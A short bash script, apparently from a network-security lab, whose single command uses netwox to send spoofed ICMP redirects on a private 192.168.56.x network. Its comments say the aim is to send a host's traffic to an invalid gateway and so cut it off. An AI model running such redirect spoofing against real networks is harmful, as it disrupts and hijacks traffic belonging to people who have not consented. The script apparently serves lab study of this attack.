#!/bin/bash

# Attempt to redirect traffic from a valid IP to an invalid IP
# `192.168.56.133` is an invalid IP in an attempt to stop traffic from routing to `192.168.56.101`
sudo netwox 86 -d Eth1 --gw 192.168.56.133 -c 0 -i 192.168.56.101
